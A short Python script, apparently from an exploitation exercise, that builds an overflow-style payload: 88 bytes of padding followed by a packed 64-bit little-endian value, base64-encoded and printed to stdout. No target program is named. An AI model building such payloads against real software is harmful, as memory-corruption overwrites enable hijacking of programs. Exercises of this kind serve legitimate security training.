
import sys
import struct
import base64

buf = b'IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII'
buf += struct.pack('<Q', 2580878220500829420)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
